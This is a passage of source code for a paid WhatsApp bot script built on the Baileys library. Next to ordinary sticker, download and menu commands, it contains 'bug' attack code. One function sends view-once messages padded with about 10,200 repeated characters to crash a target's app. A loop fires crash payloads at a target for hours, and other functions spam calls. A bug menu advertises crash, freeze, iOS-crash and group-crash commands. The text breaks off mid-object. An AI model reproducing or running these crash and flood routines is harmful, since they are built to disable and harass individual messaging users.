//CLEAR CONSOLE
console.clear();

//END
//SCANING CONTROL

require('./database/settings')
//END
//INSTALLING BAILEYS

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
	generateWAMessageContent,
	makeInMemoryStore,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys");

//END
//EXPORTS BASIC MODULE

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const jimp = require("jimp")
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { VocalRemover } = require('./database/pusat/Data8');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')

//END
//MODULE MESSAGE + PREFIX

module.exports = sock = async (sock, m, chatUpdate, store) => {
    try {
      var body = (
      m.mtype === "conversation" ? m.message.conversation :
      m.mtype === "imageMessage" ? m.message.imageMessage.caption :
      m.mtype === "videoMessage" ? m.message.videoMessage.caption :
      m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
      m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
      m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
      m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
      m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
      m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);
        var budy = (typeof m.text == 'string' ? m.text : '');
        var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? 
                        body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" 
                      : global.prefa ?? global.prefix
  
//END
//DATA TAMBAHAN + PELENGKAP
const { 
smsg, 
tanggal, 
getTime, 
isUrl, 
sleep, 
clockString, 
runtime, 
fetchJson, 
getBuffer, 
jsonformat, 
format, 
parseMention, 
getRandom, 
getGroupAdm, 
generateProfilePicture 
} = require('./database/pusat/Data1')



//END
//DATA USER + DATA MESSAGE

const Owner = JSON.parse(fs.readFileSync('./account/Own.json'))
const Premium = JSON.parse(fs.readFileSync('./account/Prem.json'))
const isGroup = m.chat.endsWith('@g.us')
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await sock.decodeJid(sock.user.id)
const DevOnly = [BotNum, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = 
  fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] :
  fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
  fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] :
  m.quoted ? m.quoted :
  m;
const qtext = q = args.join(" ")
const text = q = args.join(" ");
const cheerio = require('cheerio');
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await sock.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const pino = require('pino')
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const ImageBugs = [
    "https://files.catbox.moe/6ylsgb.jpg",
    "https://files.catbox.moe/6ylsgb.jpg",
    "https://files.catbox.moe/6ylsgb.jpg"
];
const RandomBugs = ImageBugs[Math.floor(Math.random() * ImageBugs.length)];
const imageList = [
    "https://files.catbox.moe/6ylsgb.jpg",
    "https://files.catbox.moe/6ylsgb.jpg",
    "https://files.catbox.moe/6ylsgb.jpg"
];
const RandomMenu = imageList[Math.floor(Math.random() * imageList.length)];
const ApocalypseCrash = fs.readFileSync('./database/pusat/image/ZenoKing.jpeg')
const babi = fs.readFileSync('./database/pusat/image/ZenoKing.jpeg')
const babi2 = fs.readFileSync('./database/pusat/image/ZenoKing.jpeg')

let ucapanWaktu
if (time >= "19:00:00" && time < "23:59:00") {
ucapanWaktu = "🌃𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐚𝐥𝐚𝐦"
} else if (time >= "15:00:00" && time < "19:00:00") {
    ucapanWaktu = "🌄𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐨𝐫𝐞"
} else if (time >= "11:00:00" && time < "15:00:00") {
ucapanWaktu = "🏞️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐢𝐚𝐧𝐠"
} else if (time >= "06:00:00" && time < "11:00:00") {
    ucapanWaktu = "🏙️𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐏𝐚𝐠𝐢"
} else {
    ucapanWaktu = "🌆𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐒𝐮𝐛𝐮𝐡"
};
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta', // Zona waktu WIB
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});
const mime = (quoted.msg || quoted).mimetype || ''
const THM = "https://files.catbox.moe/6ylsgb.jpg"
const Xxx = "https://files.catbox.moe/6ylsgb.jpg"


//END
//DATA TIKTOK SCRAPER

const { tiktok } = require('./database/pusat/Data5')
const successreact = ['〽️']
		const finishmoji = successreact[Math.floor(Math.random() * successreact.length)]
		const taskdone = (teks) => {
			return sock.sendMessage(m.chat, {
				react: {
					text: teks,
					key: m.key
				}
			})
		}
//END
//EXPORTS MODULE BRAT + STICKER

const {
imageToWebp, 
videoToWebp, 
writeExifImg, 
writeExifVid, 
writeExif, 
addExif 
} = require('./database/pusat/Data2')
//END

//SEETINGS STATUS BOT
if (!sock.public) {
if (!DevOnly) return
}

//END
//INFO NEW MESSAGE IN CONSOLE

if (command) {
  if (m.isGroup) {
    // Log untuk pesan grup
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  } else {
    // Log untuk pesan privat
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 👤 Recipient : ${BotNum} \n`
    ));
  }
}

//END
//AUTO RECORDING

let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
//sock.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

async function loading () {
var Floading = [
"",
"",
""
]
let { key } = await sock.sendMessage(from, {text: " "})
for (let i = 0; i < Floading.length; i++) {
await sock.sendMessage(from, {text: Floading[i], edit: key });
}
}

//END
//FILE RESIZE ( FAKE )

const FileSize = (number) => {
var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
var tier = Math.log10(Math.abs(number)) / 3 | 0
if(tier == 0) return number
var postfix = SI_POSTFIXES[tier]
var scale = Math.pow(10, tier * 3)
var scaled = number / scale
var formatted = scaled.toFixed(1) + ''
if (/\.0$/.test(formatted))
formatted = formatted.substr(0, formatted.length - 2)
return formatted + postfix
}

//END
//FUNCTION OBF

async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

//END
var example = (teks) => {
return `Example : ${command} ${teks}`
}

//END

// PERCOBAAN FUNCTION
async function buttonnull(target) {
    const spamMessage = "@1_".repeat(10200);
    const crashMessage = "ꦽ".repeat(10200);
    await sock.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    extendedTextMessage: {
                        text: "'Hy Bro" + spamMessage,
                        previewType: "Hola 🤣",
                        contextInfo: {
                            mentionedJid: [
                                target, 
                            ],
                        },
                    },
                },
            },
        },
        {
            participant: {
                jid: target,
            },
        }
    );
}

//Combo Bug
async function protocolzen(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 800) {
            await Promise.all([
            protocolbug5(target, false),
            protocolbug6(target), 
            ProtoX(target), 
            protocolbug7(target), 
            protocolbug5(target, false), 
            protocolbug3(target, false),
            protocolbug8(target), 
            ]);
            console.log(chalk.red(`Sending ( Crash🦠) ${count}/800 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 400 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}

//END
//SEND CALL
async function sendOfferCall(target) {
    try {
        await sock.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}

async function sendOfferVideoCall(target) {
    try {
        await sock.offerCall(target, { 
        video: true 
        });
        console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Video Call To Target:`, error));
    }
}
sock.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  body: {
                     text: opts && opts.body ? opts.body : ''
                  },
                  footer: {
                     text: opts && opts.footer ? opts.footer : ''
                  },
                  nativeFlowMessage: {
                     buttons: buttons,
                     messageParamsJson: ''
                  }
               }
            }
         }
      }, {
         quoted
      })
      await sock.sendPresenceUpdate('composing', jid)
      return sock.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
const xreplyWithButton = (teks) => {
  const buttons = [
    {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: '༑⌁⃰𝐁𝐮͢𝐲 𝑺͢𝒄𝒓𝒊ͯ͢𝒑𝒕ཀ͜͡'
      }
    }
  ];

  const buttonMessage = {
    image: { url: RandomMenu },
    caption: teks,
    footer: 'VANZ INVITCUS ',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363417794292944@newsletter",
        serverMessageId: null,
        newsletterName: `VANZ INVITCUS `
      },
      mentionedJid: ['13135550002@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
const xreplybugbutton = (teks) => {
  const buttons = [
    {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
      }
    }
  ];

  const buttonMessage = {
    image: { url: RandomBugs },
    caption: teks,
    footer: 'VANZ INVITCUS ',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363417794292944@newsletter",
        serverMessageId: null,
        newsletterName: `VANZ INVITCUS  `
      },
      mentionedJid: ['13135550002@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
const kontolreply = (teks) => {
    return sock.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `@VANZSTOR1`,
                body: `𝐆𝐘𝐙𝐄𝐍 𝐌𝐒𝐁𝐑𝐄𝐖`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: RandomMenu,
                sourceUrl: `https://whatsapp.com/channel/0029VbB1IchCcW4rWYFbwt1S`
            }
        }
    }, { quoted: lol });
}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "9999",
      status: "INQUIRY",
      surface: "",
      message: `𝐆𝐨𝐝|marc\n𝐂𝐨𝐦𝐦𝐚𝐝 : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const lol2 = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
		
const ThumbUrl = "https://files.catbox.moe/6ylsgb.jpg"
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, sock, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await sock.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `@VANZSTOR1 `,
                    body: `©VANZ INVITCUS`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: ThumbUrl, 
                    sourceUrl: `https://youtube.com/@vanzstor`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        xreplyWithButton('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

let limitUser = PremOnly ? 1 : global.limitCount
async function useLimit(sender, amount) {
     users.limit -= amount;
     users.totalLimit += amount;
     m.reply(`Limit Anda Telah Digunakan Sebanyak ${amount} Dari ${users.limit} Limit Kamu`,
        );
 }
  
//=================================================//

const RunTime = `_${runtime(process.uptime())}_`
const namaOrang = m.pushName || "No Name";
const info = `${namaOrang}`;
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
switch(command) {
case 'menu': {
  let limitnya = useLimit;
  let Menu = `*— ( 🐉 ) ⾷ Olaa.. ${info}*
\`\`\`Selamat Datang Di Menu Kami Ya Kalian Akan Di Bantu Bot Untuk Apapun\`\`\`

\`-# Information  Script\`
\`⾒\` *Developer :* VANZZ
\`⺙\` *Name Script :*   SC CEK BIO BY DIMZ
\`⺓\` *Verison Script :* Vvip Buy Only! 
\`グ\` *Mode Bot:* ${sock.public ? "Public 開" : "Private 用"}
\`ボ\` *Status User:* ${DevOnly ? "Owner 公" : PremOnly ? "Premium プム" : "User"}
\`見 Runtime : ${runtime(process.uptime())}\``;
const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: '༑⌁⃰𝐁𝐮͢𝐲 𝑺͢𝒄𝒓𝒊ͯ͢𝒑𝒕ཀ͜͡'
    }
  }
];

const buttonMessage = {
  image: { url: RandomMenu },
  caption: Menu,
  footer: 'VANZ INVITCUS ',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363417794292944@newsletter",
      serverMessageId: null,
      newsletterName: `VANZ INVITCUS  `
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

const nativeFlowButton = {
  buttonId: 'action',
  buttonText: { displayText: 'Options' },
  type: 4,
  nativeFlowInfo: {
    name: 'single_select',
    paramsJson: JSON.stringify({
      title: "𝐒𝐄𝐋𝐋𝐄𝐂𝐓 - 𝐌𝐄𝐍𝐔",
      sections: [
        {
          title: "⌜ 𝐑𝐄𝐂𝐎𝐌𝐌𝐄𝐍𝐃𝐄𝐃 ⌟",
          highlight_label: "〽️",
          rows: [
            {
              header: "",
              title: "𝕭𝖚𝖌 𝕸𝖊𝖓𝖚",
              description: "",
              id: `.bugmenu`
            },
            {
              header: "",
              title: "𝕺𝖜𝖓𝖊𝖗 𝕸𝖊𝖓𝖚",
              description: "",
              id: `.ownmenu`
            }
          ]
        },
        {
          title: "⌜ 𝐂𝐫𝐞𝐝𝐳 Ϟ 𝐇𝐚𝐥𝐥 ⌟",
          highlight_label: "",
          rows: [
            {
              header: "",
              title: "𝕿𝖍𝖆𝖓𝖐𝖘 𝕿𝖔",
              description: "",
              id: `.tqto`
            }
          ]
        },
        {
          title: "⌜ 𝐆𝐲𝐳𝐞𝐧 - 𝐌𝐬𝐛𝐫𝐞𝐰 ⌟",
          highlight_label: "🌹",
          rows: [
            {
              header: "",
              title: "𝐎𝐰𝐧𝐞𝐫",
              description: "",
              id: `.owner`
            },
            {
              header: "",
              title: "𝐁𝐮𝐲 𝐒𝐜𝐫𝐢𝐩𝐭",
              description: "",
              id: `.buysc`              
            }
          ]
        }
      ]
    })
  },
  viewOnce: true
};

buttonMessage.buttons.push(nativeFlowButton);

return await sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}
break
case 'bugmenu': {
let limitnya = useLimit
let Menu = `*— ( 🐉 ) ⾷ Olaa.. ${info}*
\`\`\`Selamat Datang Di Menu Kami Ya Developer :   hanz\`\`\`

╭━≫ 血 𝐁𝐔𝐆 LIMTER ࿐
┃ ▸ ..ᴘʀᴏᴛᴏᴄᴏʟ
┃ ▸ ..ᴘʀᴏᴛᴏᴄᴏʟ𝟏
┃ ▸ ..ᴘʀᴏᴛᴏᴄᴏʟ𝟐
┃ ▸ ..ᴘʀᴏᴛᴏᴄᴏʟ𝟑
┃ ▸ ..ᴘʀᴏᴛᴏᴄᴏʟ𝟒
┃ ▸ ..ᴘʀᴏᴛᴏᴄᴏʟ𝟓
┃ ▸ ..ᴘʀᴏᴛᴏxᴢᴇɴ
╰━━━━━━━━━━━〣

╭━≫ 血 𝐁𝐔𝐆 𝐔𝐈 ࿐
┃ ▸ ..ʙʟᴀɴᴋ-ᴜɪ
┃ ▸ ..xᴀɴᴅʀᴏs-ᴜɪ
┃ ▸ ..xᴅᴇʟᴀʏᴜɪ
┃ ▸ ..ᴍᴇᴛᴀ-ᴀɪ
┃ ▸ ..ᴜɪғᴏʀᴄᴇ
╰━━━━━━━━━━━〣

╭━≫ 血 𝐁𝐔𝐆 𝐈𝐎𝐒 ࿐
┃ ▸ ..xɪᴏs
┃ ▸ ..ᴄʀᴀʜɪᴏs
┃ ▸ ..ᴛʀᴀsʜɪᴏs
┃ ▸ ..ʟᴜᴄɪᴏs
╰━━━━━━━━━━━〣

╭━≫ 血 𝐁𝐔𝐆 𝐒𝐏𝐀𝐌 ࿐
┃ ▸ ..sᴘᴀᴍᴍᴇɴᴜ
┃ ▸ ..sᴘᴀᴍᴄᴀʟʟ
┃ ▸ ..sᴘᴀᴍᴘᴀɪʀ
╰━━━━━━━━━━━〣

╭━≫ 血 𝐁𝐔𝐆 𝐅𝐑𝐄𝐙𝐄-𝐅𝐂 ࿐
┃ ▸ ..ᴛʏᴘᴇʙᴜɢ
┃ ▸ ..xʙᴜɢ
┃ ▸ ..ᴠᴏɪᴅ
┃ ▸ ..ғʀᴇᴢᴇᴄʜᴀᴛ
┃ ▸ ..ᴘʏᴍᴇɴᴛᴄʀᴀsʜ
╰━━━━━━━━━━━〣

╭━≫ 血 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐁 ࿐
┃ ▸ ..sᴛᴜᴄᴋɢʙ
┃ ▸ ..ᴄʀᴀsʜɢʙ
┃ ▸ ..ʙʟᴀɴᴋɢʙ
┃ ▸ ..ғᴏʀᴄʟᴏsᴇɢʙ
╰━━━━━━━━━━━〣
\`クラッシャーフォーエックス\`
*Press The Menu Button Below 🩸*`
const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: '༑⌁⃰𝐁𝐮͢𝐲 𝑺͢𝒄𝒓𝒊ͯ͢𝒑𝒕ཀ͜͡'
    }
  }
];

const buttonMessage = {
  image: { url: RandomMenu },
  caption: Menu,
  footer: 'VANZ INVITCUS ',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363417794292944@newsletter",
      serverMessageId: null,
      newsletterName: `VANZ INVITCUS  `
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

const nativeFlowButton = {
  buttonId: 'action',
  buttonText: { displayText: 'Options' },
  type: 4,
  nativeFlowInfo: {
    name: 'single_select',
    paramsJson: JSON.stringify({
      title: "𝐒𝐄𝐋𝐋𝐄𝐂𝐓 - 𝐌𝐄𝐍𝐔",
      sections: [
        {
          title: "⌜ 𝐑𝐄𝐂𝐎𝐌𝐌𝐄𝐍𝐃𝐄𝐃 ⌟",
          highlight_label: "〽️",
          rows: [
            {
              header: "",
              title: "𝕭𝖚𝖌 𝕸𝖊𝖓𝖚",
              description: "",
              id: `.bugmenu`
            },
            {
              header: "",
              title: "𝕺𝖜𝖓𝖊𝖗 𝕸𝖊𝖓𝖚",
              description: "",
              id: `.ownmenu`
            }
          ]
        },
        {
          title: "⌜ 𝐂𝐫𝐞𝐝𝐳 Ϟ 𝐇𝐚𝐥𝐥 ⌟",
          highlight_label: "",
          rows: [
            {
              header: "",
              title: "𝕿𝖍𝖆𝖓𝖐𝖘 𝕿𝖔",
              description: "",
              id: `.tqto`
            }
          ]
        },
        {
          title: "⌜ 𝐆𝐲𝐳𝐞𝐧 - 𝐌𝐬𝐛𝐫𝐞𝐰 ⌟",
          highlight_label: "🌹",
          rows: [
            {
              header: "",
              title: "𝐎𝐰𝐧𝐞𝐫",
              description: "",
              id: `.owner`
            },
            {
              header: "",
              title: "𝐁𝐮𝐲 𝐒𝐜𝐫𝐢𝐩𝐭",
              description: "",
              id: `.buysc`              
            }
          ]
        }
      ]
    })
  },
  viewOnce: true
};

buttonMessage.buttons.push(nativeFlowButton);

return await sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}

break
case 'ownmenu': {
let limitnya = useLimit
let Menu = `*— ( 🐉 ) ⾷ Olaa.. ${info}*
\`\`\`Selamat Datang Di Menu Kami Ya Developer :   hanz  \`\`\`

\`—( Ｉｎｆｏｒｍａｔｉｏｎ )—\`
\`⺙\` *Script :* SC CEK BIO BY DIMZ
\`⺓\` *Developer :* VANZ
\`⺓\` *Verison :* Vvip Buy Only! 
\`グ\` *Mode :* ${sock.public ? "Public 開" : "Self 用"}
\`ボ\` *Status :* ${DevOnly ? "Owner 公" : PremOnly ? "Premium プム" : "User"}
\`見 Runtime : ${runtime(process.uptime())}\`

「 \`Bot Seting\` 」
│ sᴇʟғ 
│ public 
│ᴛᴇs
 
│ ᴀᴅᴅᴘʀᴇᴍ *‹62xxx›*
│ ᴅᴇʟᴘʀᴇᴍ *‹62xxx›*
│ ᴀᴅᴅᴏᴡɴᴇʀ *‹62xxx›*
│ ᴅᴇʟᴏᴡɴᴇʀ *‹62xxx›*
 
│ sᴇᴛᴘᴘ *‹62xxx›*
│ ᴅᴇʟᴘᴘ *‹62xxx›*


「 \`Group Menu\` 」
│ ᴋɪᴄᴋ *‹62xxx›*
│ ᴛᴀɢᴀʟʟ *‹TagMember›*
│ ʟɪɴᴋɢʀᴏᴜᴘ *‹InGroup›*
│ ʀᴇsᴇᴛʟɪɴᴋɢᴄʟᴄ *‹InGroup›*
│ ᴊᴏɪɴ *‹LinkGroup›*

「 \`Tolls Menu\` 」
│ ᴛᴇᴍᴘʙᴀɴ *‹62xxx›*
│ ʀᴇᴀᴄᴛᴄʜ *‹LinChannel›*
│ ᴛᴏᴜʀʟ *‹Reply/Image›*
│ ʙʀᴀᴛ *‹Text›*
│ ʀᴠᴏ *‹Video/Image›*

「 \`Fun Menu\` 」
│ ᴛɪᴋᴛᴏᴋ *‹Reply/Link›*
│ ᴘʟᴀʏ *‹SearchMusic›*
│ ᴛᴏᴠɴ *‹Reply/Image›*
│ sᴛɪᴄᴋᴇʀ *‹Reply/Image›*
│ ǫᴄ *‹Text›*`
const buttons = [
  {
    buttonId: '.owner',
    buttonText: {
      displayText: '༑⌁⃰𝐃𝐞͢𝐯𝐨𝐥𝒐ͯ͢𝒑𝒆𝒓ཀ͜͡'
    }
  },
  {
    buttonId: '.buysc',
    buttonText: {
      displayText: '༑⌁⃰𝐁𝐮͢𝐲 𝑺͢𝒄𝒓𝒊ͯ͢𝒑𝒕ཀ͜͡'
    }
  }
];

const buttonMessage = {
  image: { url: RandomMenu },
  caption: Menu,
  footer: 'VANZ INVITCUS ',
  buttons: buttons,
  headerType: 6,
  contextInfo: { 
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363417794292944@newsletter",
      serverMessageId: null,
      newsletterName: `VANZ INVITCUS  `
    },
    mentionedJid: ['13135550002@s.whatsapp.net'],
  },
  viewOnce: true
};

const nativeFlowButton = {
  buttonId: 'action',
  buttonText: { displayText: 'Options' },
  type: 4,
  nativeFlowInfo: {
    name: 'single_select',
    paramsJson: JSON.stringify({
